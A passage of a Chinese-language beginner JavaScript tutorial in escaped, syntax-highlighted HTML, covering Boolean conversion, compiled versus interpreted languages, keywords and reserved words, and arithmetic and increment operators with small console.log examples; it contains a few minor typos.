&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Boolean(&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;));			&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Boolean(&lt;span style=&#34;color:#66d9ef&#34;&gt;undefined&lt;/span&gt;));	&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Boolean(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;小白&amp;#39;&lt;/span&gt;));		   &lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Boolean(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;));			&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;扩展阅读&#34;&gt;扩展阅读&lt;/h1&gt;
&lt;h3 id=&#34;本节目标-2&#34;&gt;本节目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;能够知道解释型语言和编译型语言的特点&lt;/li&gt;
&lt;li&gt;能够知道标识符不能是关键字或保留字&lt;/li&gt;
&lt;li&gt;能够独立完成课后作业&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节目录-1&#34;&gt;本节目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;解释型语言和编译型语言&lt;/li&gt;
&lt;li&gt;标识符、关键字、保留字&lt;/li&gt;
&lt;li&gt;课后作业&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;1-解释型语言和编译型语言&#34;&gt;1. 解释型语言和编译型语言&lt;/h3&gt;
&lt;h4 id=&#34;1-概述&#34;&gt;1. 概述&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;计算机不能直接理解任何除机器语言以外的语言，所以必须要把程序员缩写的程序语言翻译成机器语言才能执行程序。程序语言翻译成机器语言的工具，被称为翻译器。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200506000526.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;翻译器翻译的方式有两种：一个是==编译==，另外一个是==解释==。两种方式之间的区别在于==翻译的时间点不同==。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编译器是在==代码执行之前进行编译==，生成中间代码文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解释器是在==运行时进行及时解释==，并立即执行（当编译器以解释方式运行的时候，也称之为解释器）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;执行过程&#34;&gt;执行过程&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;类似于请客吃饭
&lt;ul&gt;
&lt;li&gt;编译语言：首先把所有菜做好，才能上桌吃饭&lt;/li&gt;
&lt;li&gt;解释语言：好比吃火锅，边吃边涮，同时进行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200506000804.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-标识符关键字保留字&#34;&gt;2. 标识符、关键字、保留字&lt;/h3&gt;
&lt;h4 id=&#34;1-标识符&#34;&gt;1. 标识符&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;标识(zhi)符：就是指开发人员为变量、属性、函数、参数取得名字&lt;/li&gt;
&lt;li&gt;==标识符不能是关键字或保留字==&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2-关键字&#34;&gt;2. 关键字&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;关键字：是指 JS 本身已经使用了的字，不能再用它们充当变量名、方法名&lt;/li&gt;
&lt;li&gt;包括：break、case、catch、continue、default、delete、do、else、finally、for、function、if、in、instanceof、new、return、switch、this、throw、try、typeof、var、void、while、with等&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;3-保留字&#34;&gt;3. 保留字&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;保留字：实际上就是预留的“关键字”，意思是现在虽然还不是关键字，但是未来可能会称为关键字，同样不能使用它们当变量名或方法名&lt;/li&gt;
&lt;li&gt;包括：boolean、byte、cahr、class、const、debugger、double、enum、export、extends、fimal、float、goto、implements、import、int、interface、long、mative、package、private、protected、public、short、static、super、synchronized、throws、transient、volatile等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-课后作业&#34;&gt;3. 课后作业&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;给同桌讲讲两个变量的的值，算法&lt;/li&gt;
&lt;li&gt;以此询问并获取用户的姓名、年龄、性别，并打印用户信息如图。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;5-javascript-运算符&#34;&gt;5. JavaScript 运算符&lt;/h1&gt;
&lt;h2 id=&#34;本节目标-3&#34;&gt;本节目标&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;能够使用常用运算符&lt;/li&gt;
&lt;li&gt;能够说出前置递增和后置递增的区别&lt;/li&gt;
&lt;li&gt;能够说出运算符的优先级&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节目录-2&#34;&gt;本节目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;运算符&lt;/li&gt;
&lt;li&gt;算数运算符&lt;/li&gt;
&lt;li&gt;递增和递减运算符&lt;/li&gt;
&lt;li&gt;比较运算符&lt;/li&gt;
&lt;li&gt;逻辑运算符&lt;/li&gt;
&lt;li&gt;赋值运算符&lt;/li&gt;
&lt;li&gt;运算符优先级&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;51-运算符&#34;&gt;5.1 运算符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;运算符（operator）也被称为操作符，是用于实现赋值、比较和执行算数运算等功能的符号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;JavaScript中常用的运算符有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;算数运算符&lt;/li&gt;
&lt;li&gt;递增和递减运算符&lt;/li&gt;
&lt;li&gt;比较运算符&lt;/li&gt;
&lt;li&gt;逻辑运算符&lt;/li&gt;
&lt;li&gt;赋值运算符&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;52-算数运算符&#34;&gt;5.2 算数运算符&lt;/h2&gt;
&lt;h3 id=&#34;521-算数运算符概述&#34;&gt;5.2.1 算数运算符概述&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念：算数运算使用的符号，用于执行两个变量或值得算数运算&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;运算符&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;th&gt;实例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;加&lt;/td&gt;
&lt;td&gt;10 + 20 = 30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;减&lt;/td&gt;
&lt;td&gt;10 - 20 = -10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;td&gt;乘&lt;/td&gt;
&lt;td&gt;10 * 20 = 200&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/&lt;/td&gt;
&lt;td&gt;除&lt;/td&gt;
&lt;td&gt;10 / 20 = 0.5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%&lt;/td&gt;
&lt;td&gt;取余数（取模）&lt;/td&gt;
&lt;td&gt;返回除法的余数 9 % 2 = 1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;522-浮点数得精度问题&#34;&gt;5.2.2 浮点数得精度问题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;浮点数值得最高精度是17位小数，但在进行算数计算时其精确度远远不如整数。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 结果不是0.3，而是：0.30000000000000004
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.07&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 结果不是7，而是：7.000000000000001
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;所以不要直接判断两个浮点数是否相等&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. % 取余（取模）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 浮点数，算数运算里面会有问题
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 0.30000000000000004
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.07&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);&lt;span style=&#34;color:#75715e&#34;&gt;// 7.000000000000001
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 我们不能直接拿着浮点数来进行相比较，是否相等
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.3&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;523-课堂提问&#34;&gt;5.2.3 课堂提问&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我们怎么判断一个数能够被整除呢？
&lt;ul&gt;
&lt;li&gt;它得余数是0，就说明这个数能够被整除，这就是%取余运算符的主要用途&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;请问 1 + 2 * 3 结果是？
&lt;ul&gt;
&lt;li&gt;结果是7，注意算数运算符优先级，先乘除，后加减，有小括号先算小括号里面的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;524-表达式和返回值&#34;&gt;5.2.4 表达式和返回值&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;表达式：
&lt;ul&gt;
&lt;li&gt;是由数字、运算符、变量等以能求得数值的有意义排列方法所得的组合&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;简单理解：
&lt;ul&gt;
&lt;li&gt;是由数字、运算符、变量等组成的式子&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;表达式最终都会有一个结果，返回给我们，我们称为返回值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 是由数字、运算符、变量等组成的式子，我们称之为表达式 1 + 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 2 就是返回值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 1 + 1 = 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 在我们程序里面 2 = 1 + 1 把我们的右边表达式计算完毕，把返回值给左边
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;53-递增和递减运算符&#34;&gt;5.3 递增和递减运算符&lt;/h2&gt;
&lt;h3 id=&#34;531-递增和递减运算符概述&#34;&gt;5.3.1 递增和递减运算符概述&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如果需要反复给数字变量添加或减去1，可以使用递增（++）和递减（&amp;ndash;）运算符来完成。&lt;/li&gt;
&lt;li&gt;在JavaScript中，递增（++）和递减（&amp;ndash;）既可以放在变量前面，也可以放在变量后面。放在变量前面时，我们可以称之为前置递增（递减）运算符，放在变量后面时，我们可以称之为后置递增（递减）运算符。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：递增和递减运算符必须和变量配合使用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;532-递增运算符&#34;&gt;5.3.2 递增运算符&lt;/h3&gt;
&lt;h4 id=&#34;5321-前置递增运算符&#34;&gt;5.3.2.1 前置递增运算符&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;++num&lt;/code&gt;前置递增，就是自加1，类似于&lt;code&gt;num = num + 1&lt;/code&gt;，但是&lt;code&gt;++num&lt;/code&gt;写起来更简单&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;使用口诀：先自加1，后返回值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
